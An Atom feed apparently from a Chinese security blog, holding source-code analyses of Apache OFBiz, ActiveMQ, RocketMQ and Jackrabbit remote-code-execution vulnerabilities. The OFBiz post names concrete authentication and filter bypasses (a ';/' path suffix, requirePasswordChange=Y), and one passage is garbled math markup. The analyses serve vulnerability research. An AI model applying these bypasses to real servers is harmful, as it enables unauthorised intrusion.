<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://ch0x01e.github.io</id>
    <title>ch1e的自留地</title>
    <updated>2024-03-03T13:14:33.021Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://ch0x01e.github.io"/>
    <link rel="self" href="https://ch0x01e.github.io/atom.xml"/>
    <subtitle>Manners maketh man</subtitle>
    <logo>https://ch0x01e.github.io/images/avatar.png</logo>
    <icon>https://ch0x01e.github.io/favicon.ico</icon>
    <rights>All rights reserved 2024, ch1e的自留地</rights>
    <entry>
        <title type="html"><![CDATA[Apache OFBiz的前世今生]]></title>
        <id>https://ch0x01e.github.io/post/apache-ofbiz-de-qian-shi-jin-sheng/</id>
        <link href="https://ch0x01e.github.io/post/apache-ofbiz-de-qian-shi-jin-sheng/">
        </link>
        <updated>2024-01-13T04:27:13.000Z</updated>
        <content type="html"><![CDATA[<p>Apache OFBiz的前世今生</p>
<h1 id="前世">前世</h1>
<p>OFBiz 是开放的电子商务平台，是一个非常著名的开源项目，提供了创建基于最新J2EE/XML规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类WEB应用系统的框架。 OFBiz最主要的特点是OFBiz提供了一整套的开发基于Java的web应用程序的组件和工具。包括实体引擎, 服务引擎, 消息引擎, 工作流引擎, 规则引擎等。</p>
<h2 id="cve-2020-9496">CVE-2020-9496</h2>
<p>已知条件是漏洞的路由在<code>/webtools/control/xmlrpc</code>,直接搜xmlrpc无法找到对应路由，只能在 <code>framework/webtools/webapp/webtools/WEB-INF/controller.xml</code>下找到，但是这还是看不出来啥。</p>
<pre><code class="language-xml">&lt;request-map uri=&quot;xmlrpc&quot; track-serverhit=&quot;false&quot; track-visit=&quot;false&quot;&gt;
    &lt;security https=&quot;false&quot;/&gt;
    &lt;event type=&quot;xmlrpc&quot;/&gt;
    &lt;response name=&quot;error&quot; type=&quot;none&quot;/&gt;
    &lt;response name=&quot;success&quot; type=&quot;none&quot;/&gt;
&lt;/request-map&gt;
</code></pre>
<p>选择搜索<code>/control/*</code>，很多xml文件都存在这个路由，但是大致都差不多，都配置了一个<code>ControlServlet</code></p>
<pre><code class="language-xml">&lt;servlet&gt;
    &lt;description&gt;Main Control Servlet&lt;/description&gt;
    &lt;display-name&gt;ControlServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;ControlServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;org.apache.ofbiz.webapp.control.ControlServlet&lt;/servlet-class&gt;
    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
    &lt;servlet-name&gt;ControlServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/control/*&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;
</code></pre>
<p>找到该类对应的代码<code>framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/ControlServlet.java</code>,<code>doPost</code>方法调用了<code>doGet</code>方法，直接看<code>doGet</code>方法。代码很多，挑了关键的几行</p>
<pre><code class="language-java">public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
	    .....
        RequestHandler requestHandler = this.getRequestHandler();
        .....
                try {
            // the ServerHitBin call for the event is done inside the doRequest method
            requestHandler.doRequest(request, response, null, userLogin, delegator);
        ......
        }
    }
</code></pre>
<p>调用了<code>requestHandler.doRequest</code></p>
<pre><code class="language-java">public void doRequest(HttpServletRequest request, HttpServletResponse response, String requestUri) throws RequestHandlerException, RequestHandlerExceptionAllowExternalRequests {
    HttpSession session = request.getSession();
    Delegator delegator = (Delegator) request.getAttribute(&quot;delegator&quot;);
    GenericValue userLogin = (GenericValue) session.getAttribute(&quot;userLogin&quot;);
    doRequest(request, response, requestUri, userLogin, delegator);
}
</code></pre>
<p>他这里继续调用了自己的<code>doRequest</code>方法，调用自身<code>getControllerConfig</code>方法</p>
<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20240101111810930.png" alt="image-20240101111810930" loading="lazy"></figure>
<p>自身getControllerConfig方法中调用<code>ConfigXMLReader.getControllerConfig</code>,这个其实就是很明显去获取控制器的配置了，</p>
<pre><code class="language-java">public ConfigXMLReader.ControllerConfig getControllerConfig() {
    try {
        return ConfigXMLReader.getControllerConfig(this.controllerConfigURL);
    } catch (WebAppConfigurationException e) {
        // FIXME: controller.xml errors should throw an exception.
        Debug.logError(e, &quot;Exception thrown while parsing controller.xml file: &quot;, module);
    }
    return null;
}
</code></pre>
<p>此时传入的参数是<code>RequestHandler.controllerConfigURL</code>，controllerConfigURL在初始化的时候是通过<code>ConfigXMLReader.getControllerConfigURL(context)</code>去获取值的</p>
<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20240101112235112.png" alt="image-20240101112235112" loading="lazy"></figure>
<p><code>ConfigXMLReader.getControllerConfigURL(context)</code>的具体内容如下</p>
<pre><code class="language-java">public static URL getControllerConfigURL(ServletContext context) {
    try {
        return context.getResource(controllerXmlFileName);
    } catch (MalformedURLException e) {
        Debug.logError(e, &quot;Error Finding XML Config File: &quot; + controllerXmlFileName, module);
        return null;
    }
}
</code></pre>
<p>此时的<code>controllerXmlFileName</code>就是<code>/WEB-INF/controller.xml</code></p>
<pre><code class="language-java">public class ConfigXMLReader {

    public static final String module = ConfigXMLReader.class.getName();
    public static final String controllerXmlFileName = &quot;/WEB-INF/controller.xml&quot;;
    private static final UtilCache&lt;URL, ControllerConfig&gt; controllerCache = UtilCache.createUtilCache(&quot;webapp.ControllerConfig&quot;);
    private static final UtilCache&lt;String, List&lt;ControllerConfig&gt;&gt; controllerSearchResultsCache = UtilCache.createUtilCache(&quot;webapp.ControllerSearchResults&quot;);
    public static final RequestResponse emptyNoneRequestResponse = RequestResponse.createEmptyNoneRequestResponse();
</code></pre>
<p>也就是上文搜xmlrpc的地方。</p>
<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20240101112415633.png" alt="image-20240101112415633" loading="lazy"></figure>
<p>在RequestHandler的doRequest方法当中，调用了对应的类和方法</p>
<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20240101183415473.png" alt="image-20240101183415473" loading="lazy"></figure>
<p>在runEvent方法中通过类型去获取对应事件处理器</p>
<pre><code class="language-java">public String runEvent(HttpServletRequest request, HttpServletResponse response,
        ConfigXMLReader.Event event, ConfigXMLReader.RequestMap requestMap, String trigger) throws EventHandlerException {
    EventHandler eventHandler = eventFactory.getEventHandler(event.type);
    String eventReturn = eventHandler.invoke(event, requestMap, request, response);
    if (Debug.verboseOn() || (Debug.infoOn() &amp;&amp; &quot;request&quot;.equals(trigger))) Debug.logInfo(&quot;Ran Event [&quot; + event.type + &quot;:&quot; + event.path + &quot;#&quot; + event.invoke + &quot;] from [&quot; + trigger + &quot;], result is [&quot; + eventReturn + &quot;]&quot;, module);
    return eventReturn;
}
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20240101184036125.png" alt="image-20240101184036125" loading="lazy"></figure>
<p>然后调用了对应的EventHandler的invoke方法，我们这是xmlrpc，所以直接看<code>XmlRpcEventHandler#invoke()</code>,invoke里调用了execute()方法，直接看这个关键的execute方法吧。</p>
<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20240101185650786.png" alt="image-20240101185650786" loading="lazy"></figure>
<p>进入getRequest方法，用XmlRpcRequestParser进行解析，XmlRpcRequestParser是在<code>xmlrpc-common-3.1.3.jar</code>包中，是Java中处理XML-RPC的第三方库</p>
<pre><code class="language-java">    protected XmlRpcRequest getRequest(final XmlRpcStreamRequestConfig pConfig, InputStream pStream)
            throws XmlRpcException {
        final XmlRpcRequestParser parser = new XmlRpcRequestParser(pConfig, getTypeFactory());
        final XMLReader xr = SAXParsers.newXMLReader();
        xr.setContentHandler(parser);
        try {
            xr.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
            xr.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);
            xr.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
            xr.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
            xr.parse(new InputSource(pStream));
        } catch (SAXException | IOException e) {
            throw new XmlRpcException(&quot;Failed to parse / read XML-RPC request: &quot; + e.getMessage(), e);
        }
        final List&lt;?&gt; params = parser.getParams();
        return new XmlRpcRequest() {
            public XmlRpcRequestConfig getConfig() {
                return pConfig;
            }
            public String getMethodName() {
                return parser.getMethodName();
            }
            public int getParameterCount() {
                return params == null ? 0 : params.size();
            }
            public Object getParameter(int pIndex) {
                return params.get(pIndex);
            }
        };
    }
</code></pre>
<p>到后面其实就差不多了，就是<code>CVE-2016-5003</code>的内容了。</p>
<h2 id="修复及绕过">修复及绕过</h2>
<p>漏洞出现后，官方对这个接口进行了修复，diff如下:https://github.com/apache/ofbiz-framework/commit/d955b03fdc226d600d81d19d273e773f84b5c000。仅仅只是添加了鉴权，对该接口并没有完全修复反序列化，因此在后续的diff当中，过滤了<code>&lt;/serializable&gt;</code>,commit如下https://github.com/apache/ofbiz-framework/commit/15c209a475cb50525a6cbd1e24601355c7be1b0a，但是后续又发现<code>&lt;serializable&gt;</code>可以通过<code>&lt;serializable &gt;</code>绕过，于是又改成过滤<code>&lt;serializable</code></p>
<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20240107162119257.png" alt="image-20240107162119257" loading="lazy"></figure>
<h1 id="今生">今生</h1>
<h2 id="cve-2023-49070">CVE-2023-49070</h2>
<h3 id="分析">分析</h3>
<p>上文说到，对该接口的防护主要有以下两个</p>
<ul>
<li>为<code>/webtools/control/xmlrpc</code>接口添加了鉴权</li>
<li>过滤了<code>&lt;serilizable</code>关键字</li>
</ul>
<p>去<a href="https://archive.apache.org/dist/ofbiz/">Ofbiz官网</a>下载Ofbiz 18.12.09版本，使用vulhub的远程调试，在对应的cacheFilter打下断点。发送CVE-2020-9496的payload,可以看到，先是获取了uri是否等于<code>/control/xmlrpc</code>，并且判断是否存在<code>&lt;serilizable</code>关键字，有则直接return。</p>
<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20240107171327178.png" alt="image-20240107171327178" loading="lazy"></figure>
<p>由于对<code>&lt;serilizable</code>关键字的校验在uri之后，我们此时让<code>&quot;/control/xmlrpc&quot;.equals(uri.toLowerCase())</code>的执行结果为false，则不会对<code>&lt;serializable</code>进行校验。在Java中，分号在权限绕过的场景冲多次出现，我们可以利用分号来进行绕过。此时POST的接口为<code>/webtools/control/xmlrpc;/</code></p>
<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20240107171921443.png" alt="image-20240107171921443" loading="lazy"></figure>
<p>其次，我们来到LoginWorker类的checkLogin方法，需要我们的<code>login()</code>方法的返回结果不是error</p>
<figure data-type="image" tabindex="10"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20240107173423732.png" alt="image-20240107173423732" loading="lazy"></figure>
<p>进入<code>login()</code>方法，我们这要尽可能让他返回的结果不是error，直接找到返回error的代码</p>
<figure data-type="image" tabindex="11"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20240107173603687.png" alt="image-20240107173603687" loading="lazy"></figure>
<p>这里只需要传入参数<code>requirePasswordChange=Y</code>即可绕过登录了。</p>
<h3 id="修复">修复</h3>
<p>官方直接在https://github.com/apache/ofbiz-framework/commit/c59336f604f503df5b2f7c424fd5e392d5923a27这个commit中移除了XMLRPC相关的处理，但是并没有对登录绕过进行修复。</p>
<h2 id="cve-2023-51467">CVE-2023-51467</h2>
<p>该漏洞主要是由于上文的认证绕过+自带的Groovy的代码执行功能导致。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Apache ActiveMQ  RCE]]></title>
        <id>https://ch0x01e.github.io/post/apache-activemq-rce/</id>
        <link href="https://ch0x01e.github.io/post/apache-activemq-rce/">
        </link>
        <updated>2023-10-28T17:34:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="影响版本">影响版本</h2>
<p>Apache ActiveMQ &lt; 5.18.3</p>
<h2 id="利用条件">利用条件</h2>
<p>需要访问到61616端口(默认)。</p>
<h2 id="漏洞分析">漏洞分析</h2>
<p>这里需要的是Apache ActiveMQ &lt; 5.18.3,我这里直接下的5.18.2</p>
<p>https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f</p>
<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20231029005205594.png" alt="image-20231029005205594" loading="lazy"></figure>
<p>在新版本中添加了一个<code>OpenWireUtil.validateIsThrowable(clazz);</code>在5.18.2中的代码如下</p>
<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20231029005512964.png" alt="image-20231029005512964" loading="lazy"></figure>
<p>把5.18.3的代码下下来，看看<code>validateIsThrowable</code>方法，代码如下</p>
<pre><code class="language-java">package org.apache.activemq.openwire;

public class OpenWireUtil {

    /**
     * Verify that the provided class extends {@link Throwable} and throw an
     * {@link IllegalArgumentException} if it does not.
     *
     * @param clazz
     */
    public static void validateIsThrowable(Class&lt;?&gt; clazz) {
        if (!Throwable.class.isAssignableFrom(clazz)) {
            throw new IllegalArgumentException(&quot;Class &quot; + clazz + &quot; is not assignable to Throwable&quot;);
        }
    }
}
</code></pre>
<p>这里如果传进来的clazz不是继承自Throwable类，就会抛出异常。在上面是通过反射获取一个类，然后调用对应的构造方法。在5.18.3在中对这个反射获取到的类进行了过滤。 现在就需要找到一个可以命令执行的类去反射获取。这里是用的<code>BaseDataStreamMarshaller</code>的classloader。</p>
<p>找到BaseDataStreamMarshaller的子类ExceptionResponseMarshaller，在其中的tightUnmarshal方法中调用了tightUnmarsalThrowable，具体代码如下</p>
<pre><code class="language-java">public void tightUnmarshal(OpenWireFormat wireFormat, Object o, DataInput dataIn, BooleanStream bs) throws IOException {
    super.tightUnmarshal(wireFormat, o, dataIn, bs);
    ExceptionResponse info = (ExceptionResponse)o;
    info.setException((java.lang.Throwable) tightUnmarsalThrowable(wireFormat, dataIn, bs));
}
</code></pre>
<p>tightUnmarsalThrowable具体代码如下</p>
<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20231029011220306.png" alt="image-20231029011220306" loading="lazy"></figure>
<p>在其中说到了上文当中的createThrowable，可以反射获取一个类并且调用对应的含一个string参数的构造方法，其中<code>ExceptionResponseMarshaller</code>类是对ExceptionResponse进行序列化操作的类</p>
<p>来看<code>tightUnmarsalThrowable</code>的主要逻辑</p>
<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20231029011551743.png" alt="image-20231029011551743" loading="lazy"></figure>
<p>从BooleanStream读入一个Boolean的数据，分别调用tightUnmarshalString去获取clazz和message，应该是把类名和message从clazz从二进制流中读取出来，然后作为参数调用<code>createThrowable</code>方法，tightUnmarsalThrowable方法最后返回了一个o，根据如下代码，这个o应该是ExceptionResponse的Exception属性</p>
<pre><code class="language-java">public void tightUnmarshal(OpenWireFormat wireFormat, Object o, DataInput dataIn, BooleanStream bs) throws IOException {
    super.tightUnmarshal(wireFormat, o, dataIn, bs);

    ExceptionResponse info = (ExceptionResponse)o;
    info.setException((java.lang.Throwable) tightUnmarsalThrowable(wireFormat, dataIn, bs));

}
</code></pre>
<p>我们这只要构造一个ExceptionResponse包含恶意的类名和message发送给服务器，服务器接受到并且反序列化就可以调用<code>createThrowable</code></p>
<h2 id="exp">Exp:</h2>
<p>没有，本人在考研，就随便跟着代码先理论理解一下了，本文也是根据@X1r0z师傅的文章所写,为了不把东西忘干净，争取每天抽1h学习</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Apache RocketMQ-CVE-2023-33246]]></title>
        <id>https://ch0x01e.github.io/post/apache-rocketmq-cve-2023-33246/</id>
        <link href="https://ch0x01e.github.io/post/apache-rocketmq-cve-2023-33246/">
        </link>
        <updated>2023-09-01T14:28:21.000Z</updated>
        <content type="html"><![CDATA[<h1 id="rocketmq介绍">RocketMQ介绍</h1>
<p>消息队列中间件是分布式系统中重要的组件，主要解决应用耦合，异步消息，流量削锋等问题<br>
实现高性能，高可用，可伸缩和最终一致性架构。使用较多的消息队列有ActiveMQ，RabbitMQ，ZeroMQ，Kafka，MetaMQ，RocketMQ，这边着重介绍RocketMQ的搭建和使用。RocketMQ是阿里研发的一个队列模型的消息中间件，后开源给apache基金会成为了apache的顶级开源项目，具有高性能、高可靠、高实时、分布式特点。</p>
<h1 id="rocketmq角色介绍">RocketMQ角色介绍</h1>
<ul>
<li>Producer：消息的发送者；举例：发信者</li>
<li>Consumer：消息接收者；举例：收信者</li>
<li>Broker：暂存和传输消息；举例：邮局</li>
<li>NameServer：管理Broker；举例：各个邮局的管理机构</li>
<li>Topic：区分消息的种类；一个发送者可以发送消息给一个或者多个Topic；一个消息的接收者可以订阅一个或者多个Topic消息</li>
<li>Message Queue：相当于是Topic的分区；用于并行发送和接收消息</li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230821081957570.png" alt="image-20230821081957570" loading="lazy"></figure>
<h1 id="漏洞分析">漏洞分析</h1>
<p>CVE-2023-33246漏洞对应的补丁地址如下: <code>https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc</code></p>
<p>补丁中删除了对应FilterServer的全部内容，初步判断应该是FilterServer存在漏洞。代码跟进到<code>src/main/java/org/apache/rocketmq/broker/BrokerStartup</code>类中，该类为Broker启动的代码</p>
<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230821082905437.png" alt="image-20230821082905437" loading="lazy"></figure>
<p>main方法把createBrokerController方法返回的结果作为参数传入到start方法当中，其中createBrokerController创建了一个BrokerController返回。来到<code>BrokerStartup#start()</code></p>
<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230821083149588.png" alt="image-20230821083149588" loading="lazy"></figure>
<p><code>BrokerStartup#start()</code>先是调用上文提到的BrokerStartup的start方法，随后仅仅只是拼接了一些字符串和调用了类的getter方法，打印到日志当中。着重看start方法。</p>
<pre><code class="language-java">public void start() throws Exception {
        if (this.messageStore != null) {
            this.messageStore.start();
        }
.......
.......
.......
        if (this.filterServerManager != null) {
            this.filterServerManager.start();
        }
.......
.......
.......

    }
</code></pre>
<p>在其中找到了如上的与filterServer有关的操作，调用了<code>filterServerManager#start</code>,实际上除了调用了<code>filterServerManager#start</code>以外，还调用了其他角色的<code>start</code>方法，比如<code>remotingServer</code>，继续跟进<code>filterServerManager#start</code></p>
<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230821082539226.png" alt="image-20230821082539226" loading="lazy"></figure>
<p>在<code>filterServerManager#start</code>中会间隔一段时间调用<code>FilterServerManager.this.createFilterServer();</code>，跟进这个方法，对应代码如下</p>
<pre><code class="language-java">public void createFilterServer() {
    int more = this.brokerController.getBrokerConfig().getFilterServerNums() - this.filterServerTable.size();
    String cmd = this.buildStartCommand();
    for (int i = 0; i &lt; more; i++) {
        FilterServerUtil.callShell(cmd, log);
    }
}
</code></pre>
<p>敏锐的师傅会发现他会去调用<code>callShell</code>，并且参数还是通过调用<code>buildStartCommand</code>方法获取的<code>cmd</code>参数，这里就很像构造一个命令去执行。我们这里先来看<code>callShell</code>吧。</p>
<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230821084325985.png" alt="image-20230821084325985" loading="lazy"></figure>
<p>这里就是很明显的RCE了，并且在调用<code>exec</code>前的<code>splitShellString</code>方法也只是通过空格去分割</p>
<pre><code class="language-java">private static String[] splitShellString(final String shellString) {
    return shellString.split(&quot; &quot;);
}
</code></pre>
<p>这时候回到<code>buildStartCommand</code>方法</p>
<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230821084559031.png" alt="image-20230821084559031" loading="lazy"></figure>
<p>这里的逻辑就比较清晰了，最终会根据不同的操作系统，把``和在前面获取到的config拼接到最后的字符串当中。现在的问题就是要找到我们的可控变量。</p>
<p>阅读代码可以知道，<code>config</code>主要的内容是配置文件名和配置中的<code>NamesrvAddr</code>，这里选择在<code>this.brokerController.getBrokerConfig().getRocketmqHome()</code>获取到我们的payload。其实这个洞整体并不难分析，有意思的是具体最后RCE的payload怎么去构造。上文说到，在调用<code>exec</code>前会通过空格进行分割成一个数组，这里看到一个网上的绕过方法就是用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">@</mi><mo separator="true">,</mo><mi mathvariant="normal">具</mi><mi mathvariant="normal">体</mi><mi>p</mi><mi>a</mi><mi>y</mi><mi>l</mi><mi>o</mi><mi>a</mi><mi>d</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">看</mi><mi mathvariant="normal">‘</mi><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mi>s</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>g</mi><mi>i</mi><mi>t</mi><mi>h</mi><mi>u</mi><mi>b</mi><mi mathvariant="normal">.</mi><mi>c</mi><mi>o</mi><mi>m</mi><mi mathvariant="normal">/</mi><mi>I</mi><mn>5</mn><mi>N</mi><mn>0</mn><mi>r</mi><mi>t</mi><mi>h</mi><mi mathvariant="normal">/</mi><mi>C</mi><mi>V</mi><mi>E</mi><mo>−</mo><mn>2023</mn><mo>−</mo><mn>33246</mn><mi mathvariant="normal">‘</mi><mi mathvariant="normal">，</mi></mrow><annotation encoding="application/x-tex">@,具体payload可以看`https://github.com/I5N0rth/CVE-2023-33246`，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">@</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">具</span><span class="mord cjk_fallback">体</span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">看</span><span class="mord">‘</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault">p</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">u</span><span class="mord mathdefault">b</span><span class="mord">.</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">m</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord">5</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord">0</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">3</span><span class="mord">2</span><span class="mord">4</span><span class="mord">6</span><span class="mord">‘</span><span class="mord cjk_fallback">，</span></span></span></span>@表示给脚本或命令的所有参数。</p>
<p>本地就不具体演示了，有兴趣的师傅可以自己搭建进行验证。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[水洞之Apache Jackrabbit-CVE-2023-37895]]></title>
        <id>https://ch0x01e.github.io/post/shui-dong-zhi-apache-jackrabbit-cve-2023-37895/</id>
        <link href="https://ch0x01e.github.io/post/shui-dong-zhi-apache-jackrabbit-cve-2023-37895/">
        </link>
        <updated>2023-09-01T14:27:40.000Z</updated>
        <content type="html"><![CDATA[<h1 id="漏洞概述">漏洞概述</h1>
<p>Apache Jackrabbit是一个强大的开源内容存储库，实现了Java的内容存储库规范（JSR-170和JSR-283）。Apache Jackrabbit webapp/standalone多个版本中存在Java 对象反序列化漏洞，由于使用的commons-beanutils 组件中存在一个可通过 RMI 远程执行代码的类，可通过构造恶意序列化数据，并发送到目标系统上的 RMI 服务端口（默认为1099端口）或发送到RMI-over-HTTP路径（默认使用路径“/rmi”），当目标系统反序列化该数据时可能导致远程代码执行。</p>
<h1 id="漏洞分析">漏洞分析</h1>
<p>在漏洞概述中说到，在路径/rmi中，会引起RMI远程代码执行，通过web.xml找到<code>/rmi</code>路由对应的Servlet</p>
<pre><code class="language-xml">&lt;servlet&gt;
  &lt;servlet-name&gt;RMI&lt;/servlet-name&gt;
  &lt;servlet-class&gt;org.apache.jackrabbit.servlet.remote.RemoteBindingServlet&lt;/servlet-class&gt;
&lt;/servlet&gt;
</code></pre>
<p>对应的类为<code>org.apache.jackrabbit.servlet.remote.RemoteBindingServlet</code>，只有doGet方法</p>
<pre><code class="language-java">protected void doGet(
        HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
    response.setContentType(&quot;application/octet-stream&quot;);
    ObjectOutputStream output =
        new ObjectOutputStream(response.getOutputStream());
    output.writeObject(RemoteObject.toStub(getRemoteRepository()));
    output.flush();
}
</code></pre>
<p>先调用<code>getRemoteRepository</code>获取Repository</p>
<pre><code class="language-java">protected RemoteRepository getRemoteRepository() throws ServletException {
    if (remote == null) {
        try {
            RemoteAdapterFactory factory = getRemoteAdapterFactory();
            remote = factory.getRemoteRepository(new ServletRepository(this));
        } catch (RemoteException e) {
            throw new ServletException(
                    &quot;Failed to create the remote repository reference&quot;, e);
        }
    }
    return remote;
}
</code></pre>
<p>在获取Repository的同时，调用了<code>getRemoteAdapterFactory</code>去获取Factory，然后调用Factory的<code>getRemoteRepository</code>方法，会返回一个<code>ServerRepository</code>对象</p>
<pre><code class="language-java">public ServerRepository(
        Repository repository, RemoteAdapterFactory factory)
        throws RemoteException {
    super(factory);
    this.repository = repository;
}
</code></pre>
<p>然后返回给客户端这个远程获取到的类</p>
<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230823082740125.png" alt="image-20230823082740125" loading="lazy"></figure>
<p>客户端拿到这个Repository后，可以调用其中的<code>login</code>方法</p>
<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230823083032295.png" alt="image-20230823083032295" loading="lazy"></figure>
<p>此时的remote是<code>RemoteRepository</code>类，也是就会调用服务端的<code>login</code>方法</p>
<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230823083443644.png" alt="image-20230823083443644" loading="lazy"></figure>
<p><code>ClientRepository</code>的<code>login</code>当中存在一个<code>Credentials</code>，实现了Serializable接口</p>
<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230823083105655.png" alt="image-20230823083105655" loading="lazy"></figure>
<p><code>Credentials</code>接口的实现类之一<code>SimpleCredentials</code>存在一个<code>attributes</code>属性，是一个HashMap</p>
<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20230823083913535.png" alt="image-20230823083913535" loading="lazy"></figure>
<p>该项目自带commons-beanutils1.9.4，我们可以用cb链来打。</p>
<h1 id="exp">Exp</h1>
<p>把cb链生成的<code>PriorityQueue</code>类作为Attribute属性封装成<code>SimpleCredentials</code>，在反序列化的时候，会先反序列化SimpleCredentials里的Attribute，也就是HashMap，然后反序列化HashMap中的<code>PriorityQueue</code>，即可触发RCE。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Apache Log4j2 RCE(CVE-2021-44228)]]></title>
        <id>https://ch0x01e.github.io/post/apache-log4j2-rcecve-2021-44228/</id>
        <link href="https://ch0x01e.github.io/post/apache-log4j2-rcecve-2021-44228/">
        </link>
        <updated>2023-07-15T12:03:49.000Z</updated>
        <content type="html"><![CDATA[<h1 id="介绍">介绍</h1>
